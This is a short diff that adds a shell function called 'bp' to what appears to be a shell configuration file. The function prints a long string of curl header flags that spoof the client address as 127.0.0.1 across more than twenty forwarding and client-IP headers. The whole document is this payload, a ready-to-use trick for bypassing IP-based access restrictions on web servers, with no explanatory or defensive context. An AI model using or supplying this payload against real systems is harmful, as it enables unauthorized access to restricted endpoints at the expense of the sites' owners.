@@ -1,0 +1,3 @@
+bp() {
+echo ' -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1" -H "X-Client-IP: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" -H "True-Client-IP: 127.0.0.1" -H "X-Cluster-Client-IP: 127.0.0.1" -H "Forwarded: for=127.0.0.1;by=127.0.0.1;host=127.0.0.1;proto=http" -H "Via: 127.0.0.1" -H "Client-IP: 127.0.0.1" -H "Referer: http://127.0.0.1" -H "X-Host: 127.0.0.1" -H "X-Original-Host: 127.0.0.1" -H "X-Forwarded-Host: 127.0.0.1" -H "X-Forwarded-Scheme: http" -H "X-Forwarded-Proto: http" -H "X-Url-Scheme: http" -H "X-Custom-IP-Authorization: 127.0.0.1" -H "X-Forwarded-Server: 127.0.0.1" -H "X-ProxyUser-Ip: 127.0.0.1" -H "Base-Url: 127.0.0.1" -H "Real-IP: 127.0.0.1"'
+}
